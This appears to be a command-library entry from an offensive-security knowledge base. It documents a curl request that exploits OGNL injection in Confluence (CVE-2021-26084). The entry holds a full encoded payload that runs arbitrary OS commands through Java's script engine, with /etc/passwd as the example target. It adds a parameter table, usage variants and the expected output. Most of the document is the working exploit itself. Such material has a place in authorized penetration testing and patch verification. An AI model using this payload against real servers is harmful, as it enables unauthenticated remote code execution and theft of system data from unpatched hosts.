---
id: cmd-curl-ognl-post
data: >-
  curl -X POST
  'http://target.confluence.com/pages/createpage-entervariables.action?SpaceKey=x'
  -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode
  'queryString=aaaaaaaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var+isWin+%3d+java.lang.System.getProperty(\u0022os.name\u0022).toLowerCase().contains(\u0022win\u0022)%3b+var+cmd+%3d+new+java.lang.String(\u0022cat
  /etc/passwd\u0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\u0022cmd.exe\u0022,+\u0022/c\u0022,+cmd)%3b+}+else{p.command(\u0022bash\u0022,+\u0022-c\u0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\u0022\u0022%3b+var+output+%3d+\u0022\u0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\u0027)}%2b\u0027'
tags:
  - web-exploit
  - rce
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.494Z'
verified: false
validated: true
submitted: true
---
# curl-post-ognl-payload

## Command

```bash
curl -X POST 'http://target.confluence.com/pages/createpage-entervariables.action?SpaceKey=x' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'queryString=aaaaaaaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var+isWin+%3d+java.lang.System.getProperty(\u0022os.name\u0022).toLowerCase().contains(\u0022win\u0022)%3b+var+cmd+%3d+new+java.lang.String(\u0022cat /etc/passwd\u0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\u0022cmd.exe\u0022,+\u0022/c\u0022,+cmd)%3b+}+else{p.command(\u0022bash\u0022,+\u0022-c\u0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\u0022\u0022%3b+var+output+%3d+\u0022\u0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\u0027)}%2b\u0027'
```

## Description

This curl command sends a POST request to exploit OGNL injection in Confluence, injecting a payload that executes arbitrary code via JavaScript engine to run system commands like cat /etc/passwd. Use it to test for CVE-2021-26084 in unauthenticated scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `URL` | Target endpoint with SpaceKey query param | Yes |
| `-H 'Content-Type: ...'` | Sets form-urlencoded content type | Yes |
| `--data-urlencode` | URL-encodes the malicious queryString payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target.com/pages/createpage-entervariables.action?SpaceKey=x' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'queryString=malicious_payload_here'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/pages/createpage-entervariables.action?SpaceKey=x' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'queryString=...full_payload...' -k -v
```

## Expected Output

Successful execution returns HTTP 200 with response body containing the output of the injected command (e.g., /etc/passwd contents: root:x:0:0:root:/root:/bin/bash, daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin). Failures show OGNL errors or 404/500.

## Related

- [[commands/cat-read-etc-passwd]]
- [[procedures/Exploit-OGNL-Injection-in-Confluence-for-RCE]]
